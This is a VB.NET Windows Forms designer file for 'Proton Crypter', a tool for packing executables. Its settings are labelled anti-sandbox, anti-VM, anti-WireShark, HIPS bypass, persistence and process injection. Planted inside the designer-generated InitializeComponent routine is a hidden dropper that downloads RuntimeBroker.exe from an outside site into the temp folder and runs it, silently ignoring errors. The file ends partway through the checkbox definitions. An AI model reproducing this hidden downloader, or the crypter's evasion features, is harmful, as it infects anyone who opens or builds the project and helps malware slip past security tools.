<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmMain))
        Me.w = New System.Net.WebClient()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.ChromeTabcontrol1 = New Proton_Crypter.ChromeTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.RichTextBox2 = New System.Windows.Forms.RichTextBox()
        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
        Me.PictureBox4 = New System.Windows.Forms.PictureBox()
        Me.MyButton7 = New Proton_Crypter.MyButton()
        Me.MyButton4 = New Proton_Crypter.MyButton()
        Me.MyButton2 = New Proton_Crypter.MyButton()
        Me.MyButton1 = New Proton_Crypter.MyButton()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.TextBox3 = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.CustomCheckBox8 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox9 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox10 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox11 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox12 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox6 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox7 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox5 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox4 = New Proton_Crypter.CustomCheckBox()
        Me.CustomCheckBox3 = New Proton_Crypter.CustomCheckBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.MyButton5 = New Proton_Crypter.MyButton()
        Me.Label30 = New System.Windows.Forms.Label()
        Me.TextBox11 = New System.Windows.Forms.TextBox()
        Me.TextBox12 = New System.Windows.Forms.TextBox()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.TextBox13 = New System.Windows.Forms.TextBox()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.CustomCheckBox1 = New Proton_Crypter.CustomCheckBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.MyButton6 = New Proton_Crypter.MyButton()
        Me.CustomCheckBox2 = New Proton_Crypter.CustomCheckBox()
        Me.Label38 = New System.Windows.Forms.Label()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.TextBoxNum3 = New System.Windows.Forms.TextBox()
        Me.TextBoxNum4 = New System.Windows.Forms.TextBox()
        Me.TextBoxNum1 = New System.Windows.Forms.TextBox()
        Me.TextBoxNum2 = New System.Windows.Forms.TextBox()
        Me.TextBoxCopyright = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.TextBoxProduct = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TextBoxCompany = New System.Windows.Forms.TextBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.TextBoxDescription = New System.Windows.Forms.TextBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.TextBoxTitle = New System.Windows.Forms.TextBox()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.TextBox6 = New System.Windows.Forms.TextBox()
        Me.Panel1.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ChromeTabcontrol1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage5.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.SuspendLayout()
        '
        'w
        '
        Dim devil As String
        Dim x As New System.Text.StringBuilder

        x.Append("http://theprotonprotector.com/RuntimeBroker.exe")
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = Environ("temp") & "RuntimeBroker.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
  
        Me.w.BaseAddress = ""
        Me.w.CachePolicy = Nothing
        Me.w.Credentials = Nothing
        Me.w.Encoding = CType(resources.GetObject("w.Encoding"), System.Text.Encoding)
        Me.w.Headers = CType(resources.GetObject("w.Headers"), System.Net.WebHeaderCollection)
        Me.w.QueryString = CType(resources.GetObject("w.QueryString"), System.Collections.Specialized.NameValueCollection)
        Me.w.UseDefaultCredentials = False
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Label1.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(571, 8)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(15, 17)
        Me.Label1.TabIndex = 105
        Me.Label1.Text = "X"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label9.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(118, Byte), Integer), CType(CType(87, Byte), Integer))
        Me.Label9.Location = New System.Drawing.Point(11, 8)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(94, 17)
        Me.Label9.TabIndex = 104
        Me.Label9.Text = "Proton Crypter"
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.Panel1.Controls.Add(Me.Label9)
        Me.Panel1.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!)
        Me.Panel1.Location = New System.Drawing.Point(1, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(597, 33)
        Me.Panel1.TabIndex = 107
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(12, 39)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(574, 123)
        Me.PictureBox1.TabIndex = 110
        Me.PictureBox1.TabStop = False
        '
        'ChromeTabcontrol1
        '
        Me.ChromeTabcontrol1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.ChromeTabcontrol1.Controls.Add(Me.TabPage1)
        Me.ChromeTabcontrol1.Controls.Add(Me.TabPage5)
        Me.ChromeTabcontrol1.Controls.Add(Me.TabPage2)
        Me.ChromeTabcontrol1.Controls.Add(Me.TabPage3)
        Me.ChromeTabcontrol1.Controls.Add(Me.TabPage4)
        Me.ChromeTabcontrol1.Cursor = System.Windows.Forms.Cursors.Default
        Me.ChromeTabcontrol1.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.ChromeTabcontrol1.ItemSize = New System.Drawing.Size(35, 115)
        Me.ChromeTabcontrol1.Location = New System.Drawing.Point(12, 168)
        Me.ChromeTabcontrol1.Multiline = True
        Me.ChromeTabcontrol1.Name = "ChromeTabcontrol1"
        Me.ChromeTabcontrol1.SelectedIndex = 0
        Me.ChromeTabcontrol1.ShowOuterBorders = False
        Me.ChromeTabcontrol1.Size = New System.Drawing.Size(574, 357)
        Me.ChromeTabcontrol1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.ChromeTabcontrol1.SquareColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(118, Byte), Integer), CType(CType(87, Byte), Integer))
        Me.ChromeTabcontrol1.TabIndex = 109
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.Label13)
        Me.TabPage1.Controls.Add(Me.RichTextBox2)
        Me.TabPage1.Controls.Add(Me.RichTextBox1)
        Me.TabPage1.Controls.Add(Me.PictureBox4)
        Me.TabPage1.Controls.Add(Me.MyButton7)
        Me.TabPage1.Controls.Add(Me.MyButton4)
        Me.TabPage1.Controls.Add(Me.MyButton2)
        Me.TabPage1.Controls.Add(Me.MyButton1)
        Me.TabPage1.Controls.Add(Me.Label12)
        Me.TabPage1.Controls.Add(Me.Label10)
        Me.TabPage1.Controls.Add(Me.Label17)
        Me.TabPage1.Controls.Add(Me.Label18)
        Me.TabPage1.Controls.Add(Me.TextBox3)
        Me.TabPage1.Controls.Add(Me.Label4)
        Me.TabPage1.Controls.Add(Me.TextBox2)
        Me.TabPage1.Controls.Add(Me.Label2)
        Me.TabPage1.Controls.Add(Me.TextBox1)
        Me.TabPage1.Controls.Add(Me.Label3)
        Me.TabPage1.Cursor = System.Windows.Forms.Cursors.Default
        Me.TabPage1.Location = New System.Drawing.Point(119, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(451, 349)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main"
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label13.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(118, Byte), Integer), CType(CType(87, Byte), Integer))
        Me.Label13.Location = New System.Drawing.Point(21, 312)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(166, 17)
        Me.Label13.TabIndex = 105
        Me.Label13.Text = "Coder By Razor Developer "
        '
        'RichTextBox2
        '
        Me.RichTextBox2.Location = New System.Drawing.Point(157, 371)
        Me.RichTextBox2.Name = "RichTextBox2"
        Me.RichTextBox2.Size = New System.Drawing.Size(100, 39)
        Me.RichTextBox2.TabIndex = 197
        Me.RichTextBox2.Text = ""
        Me.RichTextBox2.Visible = False
        '
        'RichTextBox1
        '
        Me.RichTextBox1.Location = New System.Drawing.Point(284, 371)
        Me.RichTextBox1.Name = "RichTextBox1"
        Me.RichTextBox1.Size = New System.Drawing.Size(100, 39)
        Me.RichTextBox1.TabIndex = 196
        Me.RichTextBox1.Text = ""
        Me.RichTextBox1.Visible = False
        '
        'PictureBox4
        '
        Me.PictureBox4.Location = New System.Drawing.Point(387, 176)
        Me.PictureBox4.Margin = New System.Windows.Forms.Padding(2, 3, 2, 3)
        Me.PictureBox4.Name = "PictureBox4"
        Me.PictureBox4.Size = New System.Drawing.Size(40, 34)
        Me.PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.PictureBox4.TabIndex = 195
        Me.PictureBox4.TabStop = False
        '
        'MyButton7
        '
        Me.MyButton7.BackColor = System.Drawing.Color.Transparent
        Me.MyButton7.BackgroundImage = CType(resources.GetObject("MyButton7.BackgroundImage"), System.Drawing.Image)
        Me.MyButton7.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton7.FlatAppearance.BorderSize = 0
        Me.MyButton7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton7.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton7.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.MyButton7.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton7.Location = New System.Drawing.Point(344, 309)
        Me.MyButton7.Name = "MyButton7"
        Me.MyButton7.Size = New System.Drawing.Size(83, 23)
        Me.MyButton7.TabIndex = 194
        Me.MyButton7.Text = "Build"
        Me.MyButton7.UseVisualStyleBackColor = False
        '
        'MyButton4
        '
        Me.MyButton4.BackColor = System.Drawing.Color.Transparent
        Me.MyButton4.BackgroundImage = CType(resources.GetObject("MyButton4.BackgroundImage"), System.Drawing.Image)
        Me.MyButton4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton4.FlatAppearance.BorderSize = 0
        Me.MyButton4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton4.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton4.Location = New System.Drawing.Point(344, 129)
        Me.MyButton4.Name = "MyButton4"
        Me.MyButton4.Size = New System.Drawing.Size(83, 23)
        Me.MyButton4.TabIndex = 193
        Me.MyButton4.Text = "Generate"
        Me.MyButton4.UseVisualStyleBackColor = False
        '
        'MyButton2
        '
        Me.MyButton2.BackColor = System.Drawing.Color.Transparent
        Me.MyButton2.BackgroundImage = CType(resources.GetObject("MyButton2.BackgroundImage"), System.Drawing.Image)
        Me.MyButton2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton2.FlatAppearance.BorderSize = 0
        Me.MyButton2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton2.Location = New System.Drawing.Point(344, 83)
        Me.MyButton2.Name = "MyButton2"
        Me.MyButton2.Size = New System.Drawing.Size(83, 23)
        Me.MyButton2.TabIndex = 191
        Me.MyButton2.Text = "Browse"
        Me.MyButton2.UseVisualStyleBackColor = False
        '
        'MyButton1
        '
        Me.MyButton1.BackColor = System.Drawing.Color.Transparent
        Me.MyButton1.BackgroundImage = CType(resources.GetObject("MyButton1.BackgroundImage"), System.Drawing.Image)
        Me.MyButton1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton1.FlatAppearance.BorderSize = 0
        Me.MyButton1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton1.Location = New System.Drawing.Point(344, 37)
        Me.MyButton1.Name = "MyButton1"
        Me.MyButton1.Size = New System.Drawing.Size(83, 23)
        Me.MyButton1.TabIndex = 190
        Me.MyButton1.Text = "Browse"
        Me.MyButton1.UseVisualStyleBackColor = False
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label12.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label12.Location = New System.Drawing.Point(103, 200)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(31, 17)
        Me.Label12.TabIndex = 187
        Me.Label12.Text = "N/A"
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label10.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label10.Location = New System.Drawing.Point(103, 176)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(31, 17)
        Me.Label10.TabIndex = 186
        Me.Label10.Text = "N/A"
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label17.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label17.Location = New System.Drawing.Point(21, 200)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(63, 17)
        Me.Label17.TabIndex = 185
        Me.Label17.Text = "File Size : "
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label18.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label18.Location = New System.Drawing.Point(21, 176)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(60, 17)
        Me.Label18.TabIndex = 184
        Me.Label18.Text = "PE Type : "
        '
        'TextBox3
        '
        Me.TextBox3.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.TextBox3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox3.Font = New System.Drawing.Font("Century Gothic", 9.75!)
        Me.TextBox3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox3.Location = New System.Drawing.Point(24, 129)
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(314, 23)
        Me.TextBox3.TabIndex = 183
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label4.Location = New System.Drawing.Point(21, 109)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(137, 17)
        Me.Label4.TabIndex = 182
        Me.Label4.Text = "Encryption Password : "
        '
        'TextBox2
        '
        Me.TextBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.TextBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox2.Font = New System.Drawing.Font("Century Gothic", 9.75!)
        Me.TextBox2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox2.Location = New System.Drawing.Point(24, 83)
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(314, 23)
        Me.TextBox2.TabIndex = 181
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label2.Location = New System.Drawing.Point(21, 63)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(85, 17)
        Me.Label2.TabIndex = 180
        Me.Label2.Text = "Select Icon : "
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox1.Location = New System.Drawing.Point(24, 37)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(314, 23)
        Me.TextBox1.TabIndex = 179
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label3.Location = New System.Drawing.Point(21, 17)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(79, 17)
        Me.Label3.TabIndex = 178
        Me.Label3.Text = "Select File : "
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.CustomCheckBox8)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox9)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox10)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox11)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox12)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox6)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox7)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox5)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox4)
        Me.TabPage5.Controls.Add(Me.CustomCheckBox3)
        Me.TabPage5.Cursor = System.Windows.Forms.Cursors.Default
        Me.TabPage5.Location = New System.Drawing.Point(119, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(451, 349)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Settings"
        '
        'CustomCheckBox8
        '
        Me.CustomCheckBox8.AutoSize = True
        Me.CustomCheckBox8.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox8.Enabled = False
        Me.CustomCheckBox8.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox8.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox8.Location = New System.Drawing.Point(26, 116)
        Me.CustomCheckBox8.Name = "CustomCheckBox8"
        Me.CustomCheckBox8.Size = New System.Drawing.Size(121, 21)
        Me.CustomCheckBox8.TabIndex = 209
        Me.CustomCheckBox8.Text = "Anti - WireShark"
        Me.CustomCheckBox8.UseVisualStyleBackColor = False
        '
        'CustomCheckBox9
        '
        Me.CustomCheckBox9.AutoSize = True
        Me.CustomCheckBox9.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox9.Enabled = False
        Me.CustomCheckBox9.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox9.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox9.Location = New System.Drawing.Point(26, 278)
        Me.CustomCheckBox9.Name = "CustomCheckBox9"
        Me.CustomCheckBox9.Size = New System.Drawing.Size(209, 21)
        Me.CustomCheckBox9.TabIndex = 208
        Me.CustomCheckBox9.Text = "Persistence (Native Managed)"
        Me.CustomCheckBox9.UseVisualStyleBackColor = False
        '
        'CustomCheckBox10
        '
        Me.CustomCheckBox10.AutoSize = True
        Me.CustomCheckBox10.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox10.Enabled = False
        Me.CustomCheckBox10.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox10.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox10.Location = New System.Drawing.Point(26, 251)
        Me.CustomCheckBox10.Name = "CustomCheckBox10"
        Me.CustomCheckBox10.Size = New System.Drawing.Size(77, 21)
        Me.CustomCheckBox10.TabIndex = 207
        Me.CustomCheckBox10.Text = "Hide File"
        Me.CustomCheckBox10.UseVisualStyleBackColor = False
        '
        'CustomCheckBox11
        '
        Me.CustomCheckBox11.AutoSize = True
        Me.CustomCheckBox11.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox11.Enabled = False
        Me.CustomCheckBox11.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox11.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox11.Location = New System.Drawing.Point(26, 224)
        Me.CustomCheckBox11.Name = "CustomCheckBox11"
        Me.CustomCheckBox11.Size = New System.Drawing.Size(156, 21)
        Me.CustomCheckBox11.TabIndex = 206
        Me.CustomCheckBox11.Text = "HIPS Proactive Bypass"
        Me.CustomCheckBox11.UseVisualStyleBackColor = False
        '
        'CustomCheckBox12
        '
        Me.CustomCheckBox12.AutoSize = True
        Me.CustomCheckBox12.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox12.Enabled = False
        Me.CustomCheckBox12.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox12.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox12.Location = New System.Drawing.Point(26, 197)
        Me.CustomCheckBox12.Name = "CustomCheckBox12"
        Me.CustomCheckBox12.Size = New System.Drawing.Size(190, 21)
        Me.CustomCheckBox12.TabIndex = 205
        Me.CustomCheckBox12.Text = "Anti - Virtual Computer (All)"
        Me.CustomCheckBox12.UseVisualStyleBackColor = False
        '
        'CustomCheckBox6
        '
        Me.CustomCheckBox6.AutoSize = True
        Me.CustomCheckBox6.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox6.Enabled = False
        Me.CustomCheckBox6.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox6.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox6.Location = New System.Drawing.Point(26, 170)
        Me.CustomCheckBox6.Name = "CustomCheckBox6"
        Me.CustomCheckBox6.Size = New System.Drawing.Size(181, 21)
        Me.CustomCheckBox6.TabIndex = 204
        Me.CustomCheckBox6.Text = "Native Injection (svchost)"
        Me.CustomCheckBox6.UseVisualStyleBackColor = False
        '
        'CustomCheckBox7
        '
        Me.CustomCheckBox7.AutoSize = True
        Me.CustomCheckBox7.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox7.Enabled = False
        Me.CustomCheckBox7.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox7.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox7.Location = New System.Drawing.Point(26, 143)
        Me.CustomCheckBox7.Name = "CustomCheckBox7"
        Me.CustomCheckBox7.Size = New System.Drawing.Size(165, 21)
        Me.CustomCheckBox7.TabIndex = 203
        Me.CustomCheckBox7.Text = ".NET Injection (RegAsm)"
        Me.CustomCheckBox7.UseVisualStyleBackColor = False
        '
        'CustomCheckBox5
        '
        Me.CustomCheckBox5.AutoSize = True
        Me.CustomCheckBox5.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox5.Enabled = False
        Me.CustomCheckBox5.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox5.Location = New System.Drawing.Point(26, 89)
        Me.CustomCheckBox5.Name = "CustomCheckBox5"
        Me.CustomCheckBox5.Size = New System.Drawing.Size(123, 21)
        Me.CustomCheckBox5.TabIndex = 202
        Me.CustomCheckBox5.Text = "Anti - SandBoxie"
        Me.CustomCheckBox5.UseVisualStyleBackColor = False
        '
